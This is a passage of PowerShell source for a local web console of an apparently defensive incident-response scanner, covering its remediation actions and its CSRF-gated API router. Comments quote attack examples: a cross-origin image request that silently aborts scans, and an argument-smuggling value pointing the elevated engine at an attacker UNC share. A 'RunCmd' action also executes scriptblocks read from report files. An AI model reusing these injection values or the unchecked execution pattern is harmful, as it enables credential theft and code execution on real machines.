                    } else { RLog "  -> malformed reg target." 'POSSIBLE'; $failed++ }
                }
                'DeleteRegKey' {
                    if (Test-Path -LiteralPath $f.FixParam) {
                        Remove-Item -LiteralPath $f.FixParam -Recurse -Force -ErrorAction SilentlyContinue
                        if (-not (Test-Path -LiteralPath $f.FixParam)) { RLog "  -> reg key deleted." 'OK'; $ok = $true }
                        else { RLog "  -> reg key delete failed." 'POSSIBLE'; $failed++ }
                    } else { RLog "  -> key already absent." 'OK'; $ok = $true }
                }
                'KillProcess' {
                    $procId = [int]"$($f.FixParam)"
                    $p = Get-Process -Id $procId -ErrorAction SilentlyContinue
                    if ($p) {
                        Stop-Process -Id $procId -Force -ErrorAction SilentlyContinue
                        Start-Sleep -Milliseconds 300
                        if (-not (Get-Process -Id $procId -ErrorAction SilentlyContinue)) { RLog "  -> terminated PID $procId ($($p.Name))" 'OK'; $ok = $true }
                        else { RLog "  -> kill failed PID $procId" 'POSSIBLE'; $failed++ }
                    } else { RLog "  -> process already gone." 'OK'; $ok = $true }
                }
                'RunCmd' {
                    # FixParam is generated by our own engine into the trusted report file.
                    $sb = [scriptblock]::Create("$($f.FixParam)")
                    & $sb | Out-Null
                    RLog "  -> command executed." 'OK'; $ok = $true
                }
                'Quarantine' {
                    $src = "$($f.FixParam)"
                    if (-not (Test-Path -LiteralPath $src)) { RLog "  -> already absent." 'OK'; $ok = $true }
                    else {
                        $vault = Join-Path $RemReports 'quarantine'
                        if (-not (Test-Path $vault)) { New-Item -Path $vault -ItemType Directory -Force | Out-Null }
                        $sha  = (Get-FileHash -LiteralPath $src -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
                        $stub = ([System.IO.Path]::GetFileName($src)) -replace '[^a-zA-Z0-9._-]','_'
                        $tag  = "{0}_{1}" -f (Get-Date -Format 'yyyyMMddHHmmssfff'), $stub
                        $dest = Join-Path $vault "$tag.quar"
                        $moved = $false
                        try { Move-Item -LiteralPath $src -Destination $dest -Force -ErrorAction Stop; $moved = $true }
                        catch {
                            try { Copy-Item -LiteralPath $src -Destination $dest -Force -ErrorAction Stop } catch {}
                            $rpk = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
                            $cur = RGet-RegVal $rpk "PendingFileRenameOperations"   # raw Get-ItemPropertyValue throws when absent
                            if ($null -eq $cur) { $cur = @() }
                            Set-ItemProperty $rpk "PendingFileRenameOperations" ([string[]]($cur) + @("\??\$src", "")) -Type MultiString -Force -ErrorAction SilentlyContinue
                        }
                        $manifest = @{
                            OriginalPath = $src; QuarantinedAs = $dest; SHA256 = $sha
                            ThreatType = "$($f.ThreatType)"; Severity = "$($f.Severity)"; Description = "$($f.Description)"
                            QuarantinedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
                            RebootQueuedForOriginal = (-not $moved)
                            RestoreNote = "Move-Item '$dest' '$src' -Force"
                        }
                        $manifest | ConvertTo-Json | Set-Content -LiteralPath "$dest.json" -Encoding UTF8 -ErrorAction SilentlyContinue
                        if ($moved) { RLog "  -> quarantined -> $dest" 'OK' } else { RLog "  -> copied to vault; original queued for reboot deletion." 'POSSIBLE' }
                        $ok = $true
                    }
                }
                'Info'  { RLog "  -> informational; review manually." 'INFO'; $skipped++; $ok = $true }
                default { RLog "  -> no automated action for this finding." 'INFO'; $skipped++; $ok = $true }
            }
        } catch {
            RLog "  -> ERROR: $($_.Exception.Message)" 'CRITICAL'; $failed++
        }
        if ($ok -and ("$($f.FixAction)" -notin @('Info','None',''))) { $applied++ }
    }
} catch {
    RLog "[REMEDIATE] FATAL: $($_.Exception.Message)" 'CRITICAL'
} finally {
    $RemState.Remediating = $false
    # snapshot: the rollback file's path. $RemState.SnapshotPath was written and never read, so
    # the Report view's "rollback snapshot: …" line could never render and the one piece of
    # information the operator needs after a bad PURGE only ever appeared in a transient log line.
    REnqueue @{ type='remediation_complete'; applied=$applied; failed=$failed; skipped=$skipped; blocked=$blocked; snapshot="$($RemState.SnapshotPath)" }
    RLog "[REMEDIATE] Complete — applied:$applied  failed:$failed  skipped:$skipped  blocked(protected):$blocked" 'OK'
}
'@

# ── HTTP Request Router ────────────────────────────────────────────────────────
function Handle-Request {
    param($Ctx)

    $req    = $Ctx.Request
    $path   = $req.Url.AbsolutePath
    $method = $req.HttpMethod

    # CORS preflight — answered ONLY for this server's own origin. Previously this replied
    # `Allow-Origin: *` + `Allow-Methods: GET, POST`, which is precisely what let a foreign
    # page's JSON POST to /api/remediate pass preflight and execute.
    if ($method -eq 'OPTIONS') {
        $pfOrigin = "$($req.Headers['Origin'])".TrimEnd('/')
        if ($pfOrigin -and $script:ALLOWED_ORIGINS -contains $pfOrigin) {
            $Ctx.Response.StatusCode = 204
            $Ctx.Response.Headers['Access-Control-Allow-Origin']  = $pfOrigin
            $Ctx.Response.Headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
            $Ctx.Response.Headers['Access-Control-Allow-Headers'] = 'Content-Type, X-ZB-Token'
            $Ctx.Response.Headers['Vary'] = 'Origin'
        } else {
            $Ctx.Response.StatusCode = 403
        }
        try { $Ctx.Response.Close() } catch {}
        return
    }

    # Hard gate on every state-changing request, ahead of the route table so a new POST
    # route can never be added without it.
    # Gate EVERY non-safe method, not just POST. /api/scan/abort had no `$method -ne 'POST'`
    # self-guard, so as a GET it skipped the gate entirely: a cross-origin
    # <img src="http://localhost:PORT/api/scan/abort"> needs no preflight, no Origin check and
    # no token, and aborting mid-scan makes the scan runspace fall into its finally block, write
    # audit_<ts>.json and emit scan_complete — i.e. an attacker could silently truncate an
    # incident-response scan and have the console report it as COMPLETE. Covering PUT/DELETE/
    # PATCH too stops the same trick reaching the GET branches of /api/ioc and /api/profiles.
    if ($method -notin @('GET','HEAD')) {
        $denyReason = Test-RequestAllowed $req
        if ($denyReason) {
            # Start-Transcript tees the console to server_console_*.log, so this is durable.
            Write-Host "[ZeroBreach] BLOCKED $method $path — $denyReason" -ForegroundColor Yellow
            Write-JsonResponse $Ctx (@{ error = 'forbidden'; detail = $denyReason } | ConvertTo-Json -Compress) 403
            return
        }
    }

    switch -Regex ($path) {

        # Same-origin-only handshake: the GUI reads its CSRF token here at boot. With no
        # Access-Control-Allow-Origin on the response, a cross-origin page cannot read it.
        '^/api/csrf$' {
            Write-JsonResponse $Ctx (@{ token = $script:CSRF_TOKEN } | ConvertTo-Json -Compress)
        }


        '^/$' {
            Send-StaticFile $Ctx (Join-Path $script:GUI_DIR 'templates\index.html')
        }

        '^/static/' {
            # Containment check, like every other file-touching route here. AbsolutePath is
            # URL-decoded by HttpListener, so a request could carry ..\ segments; resolve the
            # candidate and confirm it really sits under gui\static before reading it.
            $rel = $path -replace '^/static/', ''
            $rel = $rel -replace '/', '\'
            $staticRoot = [IO.Path]::GetFullPath((Join-Path $script:GUI_DIR 'static'))
            $full = $null
            try { $full = [IO.Path]::GetFullPath((Join-Path $staticRoot $rel)) } catch { $full = $null }
            if (-not $full -or -not $full.StartsWith($staticRoot.TrimEnd('\') + '\', [StringComparison]::OrdinalIgnoreCase)) {
                Write-JsonResponse $Ctx '{"error":"not found"}' 404
                return
            }
            Send-StaticFile $Ctx $full
        }

        '^/api/sysinfo$' {
            Write-JsonResponse $Ctx (Get-SysInfoJson)
        }

        '^/api/state$' {
            # Same QUICK rule as the SSE sync/scan_state events: report the 1..30
            # progress index, not the raw (non-contiguous) phase number.
            $statePhase = if ($script:State.Mode -eq 'QUICK') { $script:State.PhaseIdx } else { $script:State.Phase }
            $s = [ordered]@{
                running       = $script:State.Running
                phase         = $statePhase
                phase_total   = $script:State.PhaseTotal
                phase_name    = $script:State.PhaseName
                elapsed       = $script:State.Elapsed
                threat_counts = $script:State.ThreatCounts
                scan_complete = $script:State.ScanComplete
            }
            Write-JsonResponse $Ctx ($s | ConvertTo-Json -Compress -Depth 3)
        }

        '^/api/findings$' {
            Write-JsonResponse $Ctx (@($script:State.Findings) | ConvertTo-Json -Depth 5)
        }

        '^/api/report$' {
            # Rich engine findings (with FixAction + MITRE) for the GUI; ?name=<file> or latest.
            $name = "$($req.QueryString['name'])"
            if (-not $name) { $name = $script:State.EngineReport }
            $name = [System.IO.Path]::GetFileName("$name")
            if ($name -notmatch '^(KrakenBaseline_|audit_).*\.json$') { Write-JsonResponse $Ctx '{"error":"invalid report name"}' 400; return }
            $p = Join-Path $script:REPORTS $name
            if (-not (Test-Path -LiteralPath $p)) { Write-JsonResponse $Ctx '{"error":"report not found"}' 404; return }
            Write-JsonResponse $Ctx (@(Get-EngineReportFindings $p) | ConvertTo-Json -Depth 5)
        }

        '^/api/remediate$' {
            if ($method -ne 'POST') { Write-JsonResponse $Ctx '{"error":"POST required"}' 405; return }
            if ($script:State.Running)     { Write-JsonResponse $Ctx '{"error":"scan in progress"}' 400; return }
            if ($script:State.Remediating) { Write-JsonResponse $Ctx '{"error":"remediation already running"}' 400; return }

            $parsed = Read-JsonBody $Ctx
            if (-not $parsed) { Write-JsonResponse $Ctx '{"error":"invalid JSON"}' 400; return }

            # Security: report must be a recognized file inside reports/ (basename only).
            $reportName = [System.IO.Path]::GetFileName("$($parsed.report)")
            if ($reportName -notmatch '^(KrakenBaseline_|audit_).*\.json$') { Write-JsonResponse $Ctx '{"error":"invalid report"}' 400; return }
            $reportPath = Join-Path $script:REPORTS $reportName
            if (-not (Test-Path -LiteralPath $reportPath)) { Write-JsonResponse $Ctx '{"error":"report not found"}' 404; return }

            $ids = @($parsed.ids) | Where-Object { $_ }
            if (-not $ids -or @($ids).Count -eq 0) { Write-JsonResponse $Ctx '{"error":"no findings selected"}' 400; return }

            Start-Runspace -Script $script:REMEDIATE_SCRIPT -Vars @{
                RemState   = $script:State
                RemReports = $script:REPORTS
                ReportPath = $reportPath
                FixIds     = @($ids)
            } | Out-Null
            Write-JsonResponse $Ctx '{"status":"started"}'
        }

        '^/api/export/html$' {
            $stamp = [datetime]::Now.ToString('yyyyMMdd_HHmmss')
            Write-DownloadResponse $Ctx (Get-HtmlReport) 'text/html; charset=utf-8' "zerobreach_report_$stamp.html"
        }

        '^/api/export/csv$' {
            $stamp = [datetime]::Now.ToString('yyyyMMdd_HHmmss')
            Write-DownloadResponse $Ctx (Get-CsvReport) 'text/csv; charset=utf-8' "zerobreach_findings_$stamp.csv"
        }

        '^/api/ioc$' {
            $iocJson = Join-Path $script:REPORTS 'custom_iocs.json'   # canonical, for the manager UI
            $iocText = Join-Path $script:REPORTS 'custom_iocs.ioc'    # engine -IocFile format (prefixed lines)
            $iocDefault = Join-Path $script:ROOT 'data\ioc_defaults.json'

            if ($method -eq 'POST') {
                $parsed = Read-JsonBody $Ctx
                if (-not $parsed) { Write-JsonResponse $Ctx '{"error":"invalid JSON"}' 400; return }
                $cats = @{
                    hashes  = @($parsed.hashes)  | Where-Object { $_ }
                    ips     = @($parsed.ips)     | Where-Object { $_ }
                    domains = @($parsed.domains) | Where-Object { $_ }
                    regex   = @($parsed.regex)   | Where-Object { $_ }
                    files   = @($parsed.files)   | Where-Object { $_ }
                }
                try {
                    # JSON sidecar (UI reload)
                    $out = [ordered]@{
                        hashes  = @($cats.hashes);  ips    = @($cats.ips); domains = @($cats.domains)
                        regex   = @($cats.regex);   files  = @($cats.files)
                        version = 'V23'; updated = [datetime]::Now.ToString('yyyy-MM-dd')
                    }
                    $u8 = New-Object System.Text.UTF8Encoding($false)
                    [System.IO.File]::WriteAllText($iocJson, ($out | ConvertTo-Json -Depth 4), $u8)

                    # Engine text format: prefixed so files/domains never collide on auto-detect.
                    $lines = [System.Collections.Generic.List[string]]::new()
                    $lines.Add('# ZeroBreach custom IOCs — generated by IOC Manager')
                    foreach ($h in $cats.hashes)  { $lines.Add("hash:$h") }
                    foreach ($i in $cats.ips)     { $lines.Add("ip:$i") }
                    foreach ($d in $cats.domains) { $lines.Add("domain:$d") }
                    foreach ($r in $cats.regex)   { $lines.Add("regex:$r") }
                    foreach ($f in $cats.files)   { $lines.Add("file:$f") }
                    [System.IO.File]::WriteAllText($iocText, ($lines -join "`r`n"), $u8)

                    $count = $cats.hashes.Count + $cats.ips.Count + $cats.domains.Count + $cats.regex.Count + $cats.files.Count
                    Write-JsonResponse $Ctx (@{ status='saved'; path=$iocText; json_path=$iocJson; count=$count } | ConvertTo-Json -Compress)
                } catch {
                    Write-JsonResponse $Ctx (@{ error="$($_.Exception.Message)" } | ConvertTo-Json -Compress) 500
                }
                return
            }

            # GET — return the saved set if present, else the shipped defaults.
            $src = if (Test-Path $iocJson) { $iocJson } else { $iocDefault }
            $activeText = if (Test-Path $iocText) { $iocText } else { '' }
            if (Test-Path $src) {
                try {
                    $obj = (Get-Content -LiteralPath $src -Raw) | ConvertFrom-Json
                    $obj | Add-Member -NotePropertyName '_path'   -NotePropertyValue $activeText -Force
                    $obj | Add-Member -NotePropertyName '_custom' -NotePropertyValue ([bool](Test-Path $iocJson)) -Force
                    Write-JsonResponse $Ctx ($obj | ConvertTo-Json -Depth 4)
                } catch {
                    Write-JsonResponse $Ctx (Get-Content -LiteralPath $src -Raw)
                }
            } else {
                Write-JsonResponse $Ctx '{"hashes":[],"ips":[],"domains":[],"regex":[],"files":[],"_path":"","_custom":false}'
            }
        }

        '^/api/profiles$' {
            # Scan profiles — named config presets (mode/hours/flags/IOC file), BLUEPRINT §7.4.
            # Built-ins ($script:PROFILE_BUILTINS) are read-only; user profiles persist in
            # reports/scan_profiles.json (beside custom_iocs.json — the writable config home).
            $profPath = Join-Path $script:REPORTS 'scan_profiles.json'
            $userProfiles = @()
            $profReadFailed = $false
            if (Test-Path -LiteralPath $profPath) {
                try {
                    $saved = Get-Content -LiteralPath $profPath -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
                    # Outer @( ) is load-bearing: an empty pipeline yields $null, not @(),
                    # and that $null would serialize as a literal null profile entry.
                    $userProfiles = @(@($saved.profiles) | Where-Object { $_ -and $_.name })
                } catch { $userProfiles = @(); $profReadFailed = $true }
            }

            if ($method -eq 'POST') {
                # A save against an unreadable (locked/corrupt) file would rewrite it from
                # the empty set and silently destroy every saved profile — fail instead.
                if ($profReadFailed) { Write-JsonResponse $Ctx '{"error":"scan_profiles.json exists but is unreadable or corrupt - fix or delete it, then retry"}' 500; return }
                $parsed = Read-JsonBody $Ctx
                if (-not $parsed) { Write-JsonResponse $Ctx '{"error":"invalid JSON"}' 400; return }
                $action = "$($parsed.action)".ToLower()

                if ($action -eq 'save') {
                    $p = $parsed.profile
                    $name = "$($p.name)".Trim()
                    if ($name -notmatch '^[A-Za-z0-9][A-Za-z0-9 (),\-_.]{0,47}$') { Write-JsonResponse $Ctx '{"error":"invalid profile name (1-48 chars: letters, digits, space, (),-_.)"}' 400; return }
                    if ($script:PROFILE_BUILTINS.name -contains $name) { Write-JsonResponse $Ctx '{"error":"name is reserved by a built-in profile"}' 400; return }
                    $mode = "$($p.mode)".ToUpper()
                    if (@('QUICK','FULL','DEEP','PARANOID','STEALTH') -notcontains $mode) { Write-JsonResponse $Ctx '{"error":"invalid mode"}' 400; return }
                    $hours = 0
                    if (-not [int]::TryParse("$($p.hours)", [ref]$hours) -or $hours -lt 0 -or $hours -gt 8760) {
                        # Reject rather than coerce: silently rewriting hours to 0 would turn a
                        # saved 24h triage preset into an ALL-TIME scan with a 200 response.
                        Write-JsonResponse $Ctx '{"error":"invalid hours (integer 0-8760; 0 = all time)"}' 400; return
                    }
                    $clean = [ordered]@{
                        name        = $name; mode = $mode; hours = $hours
                        html_report = ConvertTo-Flag $p.html_report; snapshot = ConvertTo-Flag $p.snapshot
                        baseline    = ConvertTo-Flag $p.baseline;    paranoid = ConvertTo-Flag $p.paranoid
                        csv         = ConvertTo-Flag $p.csv;         stealth  = ConvertTo-Flag $p.stealth
                        ioc_file    = "$($p.ioc_file)".Trim()
                    }
                    $userProfiles = @($userProfiles | Where-Object { $_ -and $_.name -ne $name })
                    if (@($userProfiles).Count -ge 50) { Write-JsonResponse $Ctx '{"error":"profile limit reached (50)"}' 400; return }
                    $userProfiles = @($userProfiles) + @([pscustomobject]$clean)
                } elseif ($action -eq 'delete') {
                    $name = "$($parsed.name)".Trim()
                    if ($script:PROFILE_BUILTINS.name -contains $name) { Write-JsonResponse $Ctx '{"error":"built-in profiles cannot be deleted"}' 400; return }
                    $before = @($userProfiles).Count
                    $userProfiles = @($userProfiles | Where-Object { $_ -and $_.name -ne $name })
                    if (@($userProfiles).Count -eq $before) { Write-JsonResponse $Ctx '{"error":"profile not found"}' 404; return }
                } else {
                    Write-JsonResponse $Ctx '{"error":"action must be save or delete"}' 400; return
                }

                try {
                    $out = [ordered]@{
                        version  = 'V23'
                        updated  = [datetime]::Now.ToString('yyyy-MM-dd HH:mm:ss')
                        profiles = @($userProfiles)
                    }
                    Write-Utf8Json $profPath $out
                } catch {
                    Write-JsonResponse $Ctx (@{ error = "$($_.Exception.Message)" } | ConvertTo-Json -Compress) 500; return
                }
                Write-JsonResponse $Ctx (@{ status = $action; profiles = (@($script:PROFILE_BUILTINS) + @($userProfiles)) } | ConvertTo-Json -Depth 4)
                return
            }

            # GET — built-ins first, then saved user profiles.
            Write-JsonResponse $Ctx (@{ profiles = (@($script:PROFILE_BUILTINS) + @($userProfiles)) } | ConvertTo-Json -Depth 4)
        }

        '^/api/scan/start$' {
            if ($method -ne 'POST') { Write-JsonResponse $Ctx '{"error":"POST required"}' 405; return }
            if ($script:State.Running) { Write-JsonResponse $Ctx '{"error":"scan already running"}' 400; return }

            $body   = Read-RequestBody $Ctx
            $parsed = $null
            if ($body -and $body.Trim() -and $body.Trim() -ne '{}') {
                try { $parsed = $body | ConvertFrom-Json -ErrorAction Stop } catch { $parsed = $null }
                # Fail closed: a garbled config must NOT silently start a default-scope scan
                # (wrong mode/hours/no IOC file on an IR box, reported as success).
                if (-not $parsed) { Write-JsonResponse $Ctx '{"error":"invalid JSON"}' 400; return }
            }
            $cfg    = @{}
            if ($parsed) {
                $parsed.PSObject.Properties | ForEach-Object { $cfg[$_.Name] = $_.Value }
            }

            Start-Runspace -Script $script:SCAN_SCRIPT -Vars @{
                ScanState   = $script:State
                ScanConfig  = $cfg
                ScanPsPath  = $script:SCAN_PS
                ScanReports = $script:REPORTS
                MitreMap    = $script:MITRE_MAP
            } | Out-Null

            Write-JsonResponse $Ctx '{"status":"started"}'
        }

        # Scheduled recurring scan + SMTP delivery (review #32). The Settings view rendered
        # these controls with no listeners and no route behind them — the whole SCHEDULE/SMTP
        # section did nothing. The engine registers the task itself and exits before scanning
        # (-Schedule DAILY|WEEKLY), so this spawns it and reports the child's exit code.
        '^/api/schedule$' {
            if ($method -ne 'POST') {
                # GET returns the last-applied settings so the fields repopulate on reload.
                $schedFile = Join-Path $script:REPORTS 'schedule_settings.json'
                if (Test-Path -LiteralPath $schedFile) {
                    try {
                        Write-JsonResponse $Ctx (Get-Content -LiteralPath $schedFile -Raw -ErrorAction Stop)
                        return
                    } catch {}
                }
                Write-JsonResponse $Ctx '{"schedule":"","smtp_server":"","smtp_from":"","smtp_to":""}'
                return
            }
            $sb = Read-JsonBody $Ctx
            if ($null -eq $sb) { Write-JsonResponse $Ctx '{"error":"invalid JSON"}' 400; return }
            $sched = "$($sb.schedule)".Trim().ToUpper()
            if ($sched -notin @('','DAILY','WEEKLY')) { Write-JsonResponse $Ctx '{"error":"schedule must be DAILY, WEEKLY or empty"}' 400; return }
            $smtpSrv = "$($sb.smtp_server)".Trim()
            $smtpFrm = "$($sb.smtp_from)".Trim()
            $smtpTo  = "$($sb.smtp_to)".Trim()
            # VALIDATE before these reach a child process. They are interpolated into the
            # engine's own $argBase (which builds the SYSTEM task's command line), so a value
            # containing whitespace can smuggle extra engine parameters —
            # "-SmtpTo x@y.z -IocFile \\attacker\share\evil.ioc" would make the elevated engine,
            # and later the SYSTEM task, read IOC rules from an attacker UNC path (SMB NTLM leak
            # of the machine account + attacker-controlled regex fed into -match). No whitespace,
            # no quotes, bounded length; addresses must look like addresses.
            $smtpHostRe = '^[A-Za-z0-9._\-]{1,255}$'
            $smtpAddrRe = '^[A-Za-z0-9._%+\-]{1,64}@[A-Za-z0-9.\-]{1,190}\.[A-Za-z]{2,24}$'
            if ($smtpSrv -and $smtpSrv -notmatch $smtpHostRe) { Write-JsonResponse $Ctx '{"error":"invalid smtp_server"}' 400; return }
            if ($smtpFrm -and $smtpFrm -notmatch $smtpAddrRe) { Write-JsonResponse $Ctx '{"error":"invalid smtp_from"}' 400; return }
            if ($smtpTo  -and $smtpTo  -notmatch $smtpAddrRe) { Write-JsonResponse $Ctx '{"error":"invalid smtp_to"}'  400; return }
            # Persist regardless, so the operator's SMTP details survive a reload.
            # Write-Utf8Json serialises the object itself — passing it pre-converted JSON
            # double-encoded the file, so GET returned a JSON *string* and the settings never
            # repopulated in the UI.
            try {
                Write-Utf8Json (Join-Path $script:REPORTS 'schedule_settings.json') ([ordered]@{
                    schedule = $sched; smtp_server = $smtpSrv; smtp_from = $smtpFrm; smtp_to = $smtpTo
                })
            } catch {}

            if (-not $sched) {
                # Disabled: remove any task we previously registered.
                try { Unregister-ScheduledTask -TaskName 'ZeroBreach_V22_Scheduled' -Confirm:$false -ErrorAction Stop | Out-Null
                      Write-JsonResponse $Ctx '{"status":"schedule removed"}' }
                catch { Write-JsonResponse $Ctx '{"status":"no schedule was registered"}' }
                return
            }
            # Start-Process -ArgumentList does NOT quote array elements — it joins them with a
            # single space — so the engine path and -OutDir broke apart on any install directory
            # containing a space (the portable zip is explicitly validated for spaced paths, and
            # the route failed there with a bare "exit code -196608"). Quote each argument that
            # can contain a space ourselves. The SMTP values are already whitespace-free by the
            # validation above, so this is now correct on both counts.
            $q = { param($v) '"' + ("$v" -replace '"','\"') + '"' }
            $schedArgs = @(
                '-NoProfile','-ExecutionPolicy','Bypass',
                '-File', (& $q $script:SCAN_PS),
                '-Schedule', $sched, '-Auto',
                '-OutDir', (& $q $script:REPORTS)
            )
            if ($smtpTo -and $smtpFrm -and $smtpSrv) {
                $schedArgs += @('-SmtpTo', $smtpTo, '-SmtpFrom', $smtpFrm, '-SmtpServer', $smtpSrv)
            }
            # ProcessStartInfo + WaitForExit(timeout) rather than Start-Process -Wait: the accept
            # loop is strictly single-threaded, so an unbounded wait here freezes the ENTIRE
            # console (SSE stream, scan progress, abort) until the child exits. Register-Scheduled
            # Task on a domain-joined box can take a long time; cap it.
            try {
                $spi = [System.Diagnostics.ProcessStartInfo]::new()
                $spi.FileName        = 'powershell.exe'
                $spi.Arguments       = ($schedArgs -join ' ')
                $spi.UseShellExecute = $false
                $spi.CreateNoWindow  = $true
                $sp = [System.Diagnostics.Process]::Start($spi)
                if (-not $sp.WaitForExit(90000)) {
                    try { $sp.Kill() } catch {}
                    Write-JsonResponse $Ctx '{"error":"schedule registration timed out after 90s"}' 500
                    return
                }
                if ($sp.ExitCode -eq 0) {
                    Write-JsonResponse $Ctx (@{ status = "scheduled task registered ($sched 02:00)" } | ConvertTo-Json -Compress)
                } else {
                    Write-JsonResponse $Ctx (@{ error = "engine exited with code $($sp.ExitCode)" } | ConvertTo-Json -Compress) 500
                }
            } catch {
                Write-JsonResponse $Ctx (@{ error = "$($_.Exception.Message)" } | ConvertTo-Json -Compress) 500
            }
        }

        '^/api/scan/abort$' {
            # Self-guard like every other mutating route, so this can never again be reached
            # by a method that skips the gate above.
            if ($method -ne 'POST') { Write-JsonResponse $Ctx '{"error":"POST required"}' 405; return }
            $script:State.Running = $false
            $p = $script:State.Process
            if ($p -and -not $p.HasExited) { try { $p.Kill() } catch {} }
            Write-JsonResponse $Ctx '{"status":"aborted"}'
        }

        '^/api/events$' {
            # SSE — hand off to a background runspace; do NOT close response
            Start-Runspace -Script $script:SSE_SCRIPT -Vars @{
                SseCtx   = $Ctx
                SseState = $script:State
            } | Out-Null
        }

        '^/favicon\.ico$' {
            $Ctx.Response.StatusCode = 204
            try { $Ctx.Response.Close() } catch {}
        }

        default {
            Write-JsonResponse $Ctx '{"error":"not found"}' 404
        }
    }
}

# ── Main ───────────────────────────────────────────────────────────────────────
if ($Port -eq 0) { $Port = Get-FreePort }

# The origin allowlist for Test-RequestAllowed. The listener binds "localhost", which resolves
# to both loopback families, so accept every spelling the browser may send for THIS port —
# and nothing else.
$script:ALLOWED_ORIGINS = @(
    "http://localhost:$Port",
    "http://127.0.0.1:$Port",
    "http://[::1]:$Port"
)

$Listener = [System.Net.HttpListener]::new()
$Listener.Prefixes.Add("http://localhost:$Port/")

try { $Listener.Start() }
catch [System.Net.HttpListenerException] {
    # Locked-down machine: the URL namespace may need an explicit reservation.
    Write-Host ('[ZeroBreach] Listener blocked (' + $_.Exception.Message + '); adding URL ACL...') -ForegroundColor Yellow
    $acl = "http://localhost:$Port/"
    & netsh http add urlacl url=$acl "user=$env:USERDOMAIN\$env:USERNAME" | Out-Null
    try { $Listener.Start() }
    catch {
        Write-Host ('[ZeroBreach] Failed to start listener after URL ACL: ' + $_.Exception.Message) -ForegroundColor Red
        exit 1
    }
}
catch {
    Write-Host ('[ZeroBreach] Failed to start listener: ' + $_.Exception.Message) -ForegroundColor Red
    exit 1
}

$Url = "http://localhost:$Port"

Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║    ZEROBREACH V23 — KRAKEN CONSOLE               ║" -ForegroundColor Cyan
Write-Host "  ║    HTTP Server: $($Url.PadRight(34))║" -ForegroundColor Cyan
Write-Host "  ║    Press Ctrl+C to stop                          ║" -ForegroundColor Cyan
Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host ('[ZeroBreach] Serving GUI at ' + $Url) -ForegroundColor Green
Write-Host ('[ZeroBreach] Scan engine: ' + $script:SCAN_PS) -ForegroundColor DarkCyan

if (-not $NoBrowser) {
    $urlCapture = $Url
    # Don't open the browser on a fixed timer — poll until the server actually answers
    # a request, THEN launch. This both (a) guarantees the first browser paint never
    # races the listener and (b) pre-warms the static-file path, fixing the occasional
    # blank/grey screen seen right after the UAC launch. The accept loop (below, on the
    # main thread) serves these probe requests.
    $null = Start-Job -ArgumentList $urlCapture {
        param($u)
        for ($i = 0; $i -lt 50; $i++) {
            try {
                $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 2
                if ($r.StatusCode -eq 200) { break }
            } catch { Start-Sleep -Milliseconds 150 }
        }
        Start-Process $u
    }
}

# ── Accept loop ────────────────────────────────────────────────────────────────
try {
    while ($script:State.Listening) {
        try {
            $ctx = $null
            $ctx = $Listener.GetContext()
            Handle-Request $ctx
        }
        catch [System.Net.HttpListenerException] {
            if ($script:State.Listening) {
                Write-Host ('[ZeroBreach] Listener error: ' + $_.Exception.Message) -ForegroundColor Red
            }
            break
        }
        catch {
            $errPath = if ($null -ne $ctx) { $ctx.Request.Url.AbsolutePath } else { 'unknown' }
            Write-Host ('[ZeroBreach] Request error on ' + $errPath + ': ' + $_.Exception.Message) -ForegroundColor Yellow
            # Never leave the client hanging: if the handler died before answering, send a 500.
            if ($null -ne $ctx) { try { Write-JsonResponse $ctx '{"error":"internal server error"}' 500 } catch {} }
        }
    }
}
finally {
    $script:State.Listening = $false
    try { $Listener.Stop(); $Listener.Close() } catch {}
    Write-Host '[ZeroBreach] Server stopped.' -ForegroundColor Cyan
    if ($script:EVENT_LOG)   { Write-Host ('[ZeroBreach] Event log:   ' + $script:EVENT_LOG)   -ForegroundColor DarkCyan }
    if ($script:CONSOLE_LOG) { Write-Host ('[ZeroBreach] Console log: ' + $script:CONSOLE_LOG) -ForegroundColor DarkCyan }
    try { Stop-Transcript | Out-Null } catch {}
}
